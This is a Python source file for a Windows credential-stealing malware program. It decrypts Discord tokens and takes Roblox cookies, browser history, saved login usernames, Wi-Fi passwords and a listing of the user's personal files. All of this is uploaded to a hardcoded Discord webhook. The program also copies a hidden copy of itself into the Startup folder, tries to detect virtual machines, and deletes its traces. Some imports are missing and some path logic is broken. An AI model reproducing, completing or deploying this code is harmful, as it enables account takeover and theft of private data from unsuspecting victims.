import json
import urllib.request
import re
import shutil
import base64
import datetime
import win32crypt
from Crypto.Cipher import AES
import requests
import sqlite3
import tempfile
from pathlib import Path
import os
import sys
import platform
import subprocess
import ctypes

WEBHOOK_URL = "https://discord.com/api/webhooks/1467646691254734849/25KapUDT_ofrX2vhLanLFpLKHfR4indE5Xv4gi2Z4WPXvSio0ERBeaWo6fqxY_meCluo"

def detect_vm():
    vm_indicators = 0
    
    vm_mac_prefixes = ["00:05:69", "00:0C:29", "00:1C:14", "00:50:56", "08:00:27"]
    try:
        for nic, addrs in psutil.net_if_addrs().items():
            for addr in addrs:
                if addr.family == -1:
                    mac = addr.address.upper()
                    if any(mac.startswith(prefix) for prefix in vm_mac_prefixes):
                        vm_indicators += 2
    except:
        pass
    
    try:
        system_manufacturer = platform.uname().node
        vm_strings = ["VMware", "VirtualBox", "VBox", "QEMU", "KVM", "Xen", "Hyper-V"]
        if any(vm_str in system_manufacturer for vm_str in vm_strings):
            vm_indicators += 3
            
        for part in psutil.disk_partitions():
            try:
                total_gb = psutil.disk_usage(part.mountpoint).total / (1024**3)
                if total_gb in [64, 128, 256, 512]:
                    vm_indicators += 1
            except:
                pass
    except:
        pass
    
    if os.cpu_count() <= 2:
        vm_indicators += 1
    
    return vm_indicators >= 3

def vm_bypass():
    if detect_vm():
        time.sleep(45)
        
        class LASTINPUTINFO(ctypes.Structure):
            _fields_ = [("cbSize", ctypes.c_uint), ("dwTime", ctypes.c_uint)]
        
        lastInputInfo = LASTINPUTINFO()
        lastInputInfo.cbSize = ctypes.sizeof(lastInputInfo)
        
        try:
            ctypes.windll.user32.GetLastInputInfo(ctypes.byref(lastInputInfo))
            idle_time = (ctypes.windll.kernel32.GetTickCount() - lastInputInfo.dwTime) / 1000
            
            if idle_time < 10:
                return True
            else:
                time.sleep(60)
                return False
        except:
            return False
    return True

LOCAL = os.getenv("LOCALAPPDATA")
ROAMING = os.getenv("APPDATA")
PATHS = {
    'Discord': ROAMING + '\\discord',
    'Discord Canary': ROAMING + '\\discordcanary',
    'Lightcord': ROAMING + '\\Lightcord',
    'Discord PTB': ROAMING + '\\discordptb',
    'Opera': ROAMING + '\\Opera Software\\Opera Stable',
    'Opera GX': ROAMING + '\\Opera Software\\Opera GX Stable',
    'Amigo': LOCAL + '\\Amigo\\User Data',
    'Torch': LOCAL + '\\Torch\\User Data',
    'Kometa': LOCAL + '\\Kometa\\User Data',
    'Orbitum': LOCAL + '\\Orbitum\\User Data',
    'CentBrowser': LOCAL + '\\CentBrowser\\User Data',
    '7Star': LOCAL + '\\7Star\\7Star\\User Data',
    'Sputnik': LOCAL + '\\Sputnik\\Sputnik\\User Data',
    'Vivaldi': LOCAL + '\\Vivaldi\\User Data\\Default',
    'Chrome SxS': LOCAL + '\\Google\\Chrome SxS\\User Data',
    'Chrome': LOCAL + "\\Google\\Chrome\\User Data" + 'Default',
    'Epic Privacy Browser': LOCAL + '\\Epic Privacy Browser\\User Data',
    'Microsoft Edge': LOCAL + '\\Microsoft\\Edge\\User Data\\Default',
    'Uran': LOCAL + '\\uCozMedia\\Uran\\User Data\\Default',
    'Yandex': LOCAL + '\\Yandex\\YandexBrowser\\User Data\\Default',
    'Brave': LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
    'Iridium': LOCAL + '\\Iridium\\User Data\\Default',
    'Vencord': ROAMING + '\\Vencord'
}

def copy_exe_to_startup(exe_path):
    startup_folder = os.path.join(
        os.getenv('APPDATA'),
        'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup'
    )
    base, ext = os.path.splitext(os.path.basename(exe_path))
    destination_path = os.path.join(startup_folder, f"flickgoontech{ext}")
    
    if not os.path.exists(destination_path):
        shutil.copy2(exe_path, destination_path)
        
        try:
            FILE_ATTRIBUTE_HIDDEN = 0x02
            ctypes.windll.kernel32.SetFileAttributesW(destination_path, FILE_ATTRIBUTE_HIDDEN)
        except Exception as e:
            try:
                os.system(f'attrib +h "{destination_path}"')
            except:
                print(f"Failed to hide file: {e}")

exe_path = os.path.abspath(sys.argv[0])
copy_exe_to_startup(exe_path)

def getheaders(token=None):
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36"
    }
    if sys.platform == "win32" and platform.release() == "10.0.22000":
        headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Edg/115.0.1901.203"
    if token:
        headers.update({"Authorization": token})
    return headers

def gettokens(path):
    path += "\\Local Storage\\leveldb\\"
    tokens = []
    if not os.path.exists(path):
        return tokens
    for file in os.listdir(path):
        if not file.endswith(".ldb") and file.endswith(".log"):
            continue
        try:
            with open(f"{path}{file}", "r", errors="ignore") as f:
                for line in (x.strip() for x in f.readlines()):
                    for values in re.findall(r"dQw4w9WgXcQ:[^^.*$'(.*)'$.*\$][^^\"]*", line):
                        tokens.append(values)
        except PermissionError:
            continue
    return tokens

def getkey(path):
    with open(path + f"\\Local State", "r") as file:
        key = json.loads(file.read())['os_crypt']['encrypted_key']
    file.close()
    return key

def getip():
    try:
        with urllib.request.urlopen("https://api.ipify.org?format=json") as response:
            return json.loads(response.read().decode()).get("ip")
    except:
        return "None"

def retrieve_roblox_cookies():
    user_profile = os.getenv("USERPROFILE", "")
    roblox_cookies_path = os.path.join(user_profile, "AppData", "Local", "Roblox", "LocalStorage", "robloxcookies.dat")
    temp_dir = os.getenv("TEMP", "")
    destination_path = os.path.join(temp_dir, "RobloxCookies.dat")
    shutil.copy(roblox_cookies_path, destination_path)
    try:
        with open(destination_path, 'r', encoding='utf-8') as file:
            file_content = json.load(file)
            encoded_cookies = file_content.get("CookiesData", "")
            decoded_cookies = base64.b64decode(encoded_cookies)
            decrypted_cookies = win32crypt.CryptUnprotectData(decoded_cookies, None, None, None, 0)[1]
            decrypted_text = decrypted_cookies.decode('utf-8', errors='ignore')
            return decrypted_text
    except Exception as e:
        return str(e)

def send_roblox_cookies_after_embed():
    roblox_cookies = retrieve_roblox_cookies()
    if roblox_cookies and len(roblox_cookies) > 10:
        message = f"```\n{roblox_cookies}\n```"
        payload = {
            "content": message,
            "username": "Wife Beater"
        }
        try:
            response = requests.post(WEBHOOK_URL, data=json.dumps(payload), headers={"Content-Type": "application/json"})
            destination_path = os.path.join(os.getenv("TEMP", ""), "RobloxCookies.dat")
            try:
                if os.path.exists(destination_path):
                    os.remove(destination_path)
            except:
                pass
            return response.status_code == 204 or response.status_code == 200
        except Exception:
            destination_path = os.path.join(os.getenv("TEMP", ""), "RobloxCookies.dat")
            try:
                if os.path.exists(destination_path):
                    os.remove(destination_path)
            except:
                pass
            return False
    return False

def send_to_discord(message=None, embed=None):
    payload = {"username": "Wife Beater"}
    if message:
        payload["content"] = message
    if embed:
        payload["embeds"] = [embed]
    try:
        response = requests.post(WEBHOOK_URL, data=json.dumps(payload), headers={"Content-Type": "application/json"})
        return response.status_code == 204 or response.status_code == 200
    except Exception:
        return False

def get_history_path(browser):
    if browser == "Chrome":
        return os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data", "Default", "History")
    elif browser == "Firefox":
        profiles_path = os.path.join(os.getenv("APPDATA"), "Mozilla", "Firefox", "Profiles")
        if not os.path.exists(profiles_path):
            return None
        profile_folders = next(os.walk(profiles_path))[1]
        if not profile_folders:
            return None
        profile_folder = profile_folders[0]
        return os.path.join(profiles_path, profile_folder, "places.sqlite")
    elif browser == "Brave":
        return os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data", "Default", "History")
    elif browser == "Edge":
        return os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data", "Default", "History")
    elif browser == "Opera":
        return os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Stable", "Default", "History")
    elif browser == "Opera GX":
        return os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera GX Stable", "Default", "History")
    else:
        return None

def is_browser_installed(browser):
    path = get_history_path(browser)
    return path and os.path.exists(path)

def get_browser_history(browser, limit=200):
    original_path = get_history_path(browser)
    if not original_path or not os.path.exists(original_path):
        return
    temp_path = os.path.join(tempfile.gettempdir(), f"{browser}_history_copy")
    try:
        shutil.copy2(original_path, temp_path)
        conn = sqlite3.connect(temp_path)
        cursor = conn.cursor()
        if browser == "Firefox":
            cursor.execute("SELECT url, title, last_visit_date FROM moz_places ORDER BY last_visit_date DESC LIMIT ?", (limit,))
        else:
            cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT ?", (limit,))
        rows = cursor.fetchall()
        history_lines = []
        for url, title, timestamp in rows:
            if timestamp is not None:
                visit_time = datetime.datetime(1601, 1, 1) + datetime.timedelta(microseconds=timestamp)
                history_lines.append(f"{visit_time.strftime('%Y-%m-d %H:%M:%S')} - {title} ({url})")
            else:
                history_lines.append(f"Unknown time - {title} ({url})")
        conn.close()
        os.remove(temp_path)
        return "\n".join(history_lines)
    except:
        pass

def save_to_file(browser, data):
    user_home = os.path.expanduser("~")
    music_dir = os.path.join(user_home, "Music")
    filename = f"{browser}.txt"
    full_path = os.path.join(music_dir, filename)
    with open(full_path, 'w', encoding='utf-8') as file:
        file.write(data)
    return full_path

def send_file_to_discord(file_path, message="File from victim's PC"):
    if not os.path.exists(file_path):
        return False
    try:
        with open(file_path, 'rb') as file:
            files = {'file': (os.path.basename(file_path), file)}
            data = {'content': message}
            response = requests.post(WEBHOOK_URL, files=files, data=data)
            if response.status_code == 204:
                return True
            else:
                return False
    except:
        return False

def get_login_path(browser):
    if browser == "Chrome":
        return os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data", "Default", "Login Data")
    elif browser == "Firefox":
        profiles_path = os.path.join(os.getenv("APPDATA"), "Mozilla", "Firefox", "Profiles")
        if not os.path.exists(profiles_path):
            return None
        profile_folders = next(os.walk(profiles_path))[1]
        if not profile_folders:
            return None
        profile_folder = profile_folders[0]
        return os.path.join(profiles_path, profile_folder, "logins.json")
    elif browser == "Brave":
        return os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data", "Default", "Login Data")
    elif browser == "Edge":
        return os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data", "Default", "Login Data")
    elif browser == "Opera":
        return os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Stable", "Default", "History")
    elif browser == "Opera GX":
        return os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera GX Stable", "Default", "History")
    else:
        return None

def get_browser_logins(browser, limit=100):
    original_path = get_login_path(browser)
    if not original_path or not os.path.exists(original_path):
        return
    temp_path = os.path.join(tempfile.gettempdir(), f"{browser}_login_copy")
    try:
        shutil.copy2(original_path, temp_path)
        if browser == "Firefox":
            with open(temp_path, 'r', encoding='utf-8') as file:
                data = json.load(file)
            logins = data.get("logins", [])
            login_lines = []
            for login in logins[:limit]:
                url = login.get("hostname")
                email = login.get("encryptedUsername")
                if url and email:
                    login_lines.append(f"URL: {url}, Email: {email}")
            return "\n".join(login_lines)
        else:
            conn = sqlite3.connect(temp_path)
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value FROM logins LIMIT ?", (limit,))
            rows = cursor.fetchall()
            login_lines = []
            for url, email in rows:
                if url and email:
                    login_lines.append(f"URL: {url}, Email: {email}")
            conn.close()
            os.remove(temp_path)
            return "\n".join(login_lines)
    except Exception:
        return None

def delete_file(file_path):
    if os.path.exists(file_path):
        os.remove(file_path)

def main():
    checked = []
    for platform_name, path in PATHS.items():
        if not os.path.exists(path):
            continue
        for token in gettokens(path):
            token = token.replace("\\", "") if token.endswith("\\") else token
            try:
                token = AES.new(win32crypt.CryptUnprotectData(base64.b64decode(getkey(path))[5:], None, None, None, 0)[1], AES.MODE_GCM, base64.b64decode(token.split('dQw4w9WgXcQ:')[1])[3:15]).decrypt(base64.b64decode(token.split('dQw4w9WgXcQ:')[1])[15:])[:-16].decode()
                if token in checked:
                    continue
                checked.append(token)
                res = urllib.request.urlopen(urllib.request.Request('https://discord.com/api/v10/users/@me', headers=getheaders(token)))
                if res.getcode() != 200:
                    continue
                res_json = json.loads(res.read().decode())
                embed_user = {
                    'embeds': [{
                        'title': f"**Discord Token Found: {res_json['username']}**",
                        'description': f""" User ID:```\n {res_json['id']}\n```\nIP Info:```\n {getip()}\n```\nUsername:```\n {os.getenv("UserName")}```\nToken Location:```\n {platform_name}```\nToken:```\n{token}```""",
                        'color': 3092790,
                        'footer': {'text': "Made By Ryzen"},
                        'thumbnail': {'url': f"https://cdn.discordapp.com/avatars/{res_json['id']}/{res_json['avatar']}.png"}
                    }],
                    "username": "Wife Beater",
                }
                urllib.request.urlopen(urllib.request.Request(WEBHOOK_URL, data=json.dumps(embed_user).encode('utf-8'), headers=getheaders(), method='POST')).read().decode()
                send_roblox_cookies_after_embed()
            except (urllib.error.HTTPError, json.JSONDecodeError):
                continue
            except Exception as e:
                print(f"ERROR: {e}")
                continue

    browsers = ["Chrome", "Firefox", "Brave", "Edge", "Opera", "Opera GX"]
    installed_browsers = [browser for browser in browsers if is_browser_installed(browser)]
    if not installed_browsers:
        return

    created_files = []
    for browser in installed_browsers:
        history = get_browser_history(browser, limit=200)
        if history:
            file_path = save_to_file(f"{browser}_history", history)
            created_files.append(file_path)
            send_file_to_discord(file_path, message="Browser History")

    for browser in installed_browsers:
        logins = get_browser_logins(browser, limit=300)
        if logins:
            file_path = save_to_file(f"{browser}_logins", logins)
            created_files.append(file_path)
            send_file_to_discord(file_path, message="Browser Logins")

    for file_path in created_files:
        delete_file(file_path)

    roblox_cookies_path = os.path.join(os.getenv("TEMP", ""), "RobloxCookies.dat")
    delete_file(roblox_cookies_path)

def get_wifi_passwords():
    try:
        get_profiles_command = 'netsh wlan show profiles'
        profiles_data = subprocess.check_output(get_profiles_command, shell=True, stderr=subprocess.DEVNULL, encoding='cp850')
        profile_names = re.findall(r"All User Profile\s*:\s*(.*)", profiles_data)
        if not profile_names:
            return
        wifi_list = []
        for name in profile_names:
            profile_info = {}
            profile_name = name.strip()
            try:
                get_password_command = f'netsh wlan show profile name="{profile_name}" key=clear'
                password_data = subprocess.check_output(get_password_command, shell=True, stderr=subprocess.DEVNULL, encoding='cp850')
                password_match = re.search(r"Key Content\s*:\s*(.*)", password_data)
                if password_match:
                    password = password_match.group(1).strip()
                    profile_info['ssid'] = profile_name
                    profile_info['password'] = password
                else:
                    profile_info['ssid'] = profile_name
                    profile_info['password'] = "Password not found or network is open"
                wifi_list.append(profile_info)
            except subprocess.CalledProcessError:
                profile_info['ssid'] = profile_name
                profile_info['password'] = "Could not retrieve password"
                wifi_list.append(profile_info)
        if wifi_list:
            embed = {
                "title": "Wi-Fi Password Retrieval Results",
                "description": "Successfully retrieved saved Wi-Fi profiles and passwords.",
                "color": 5814783,
                "fields": []
            }
            for wifi in wifi_list:
                field = {
                    "name": wifi['ssid'],
                    "value": f"```{wifi['password']}```",
                    "inline": False
                }
                embed["fields"].append(field)
            send_to_discord(embed=embed)
    except Exception:
        pass

FOLDERS = ["Desktop", "Documents", "Downloads", "Pictures", "Music", "Videos"]

def format_file_info(path: Path) -> str:
    stat = path.stat()
    return (
        f"{path}\n"
        f"  Size: {stat.st_size} bytes\n"
        f"  Modified: {datetime.datetime.fromtimestamp(stat.st_mtime)}\n"
        f"  Created: {datetime.datetime.fromtimestamp(stat.st_ctime)}\n"
    )

def collect_all_files() -> str:
    home = Path.home()
    output = []
    for folder in FOLDERS:
        folder_path = home / folder
        output.append(f"\n=== {folder} ===\n")
        if folder_path.exists():
            for item in folder_path.rglob("*"):
                if item.is_file():
                    output.append(format_file_info(item))
        else:
            output.append("Folder not found.\n")
    return "\n".join(output)

def save_local_report(text: str):
    filename = "file_inventory.txt"
    Path(filename).write_text(text, encoding="utf-8")

def upload_report(text: str):
    filename = "file_inventory.txt"
    Path(filename).write_text(text, encoding="utf-8")
    try:
        with open(filename, "rb") as file_obj:
            requests.post(WEBHOOK_URL, files={"file": (filename, file_obj)})
        os.remove(filename)
    except Exception:
        pass

if __name__ == "__main__":
    main()
    get_wifi_passwords()
    report = collect_all_files()
    save_local_report(report)
    upload_report(report)
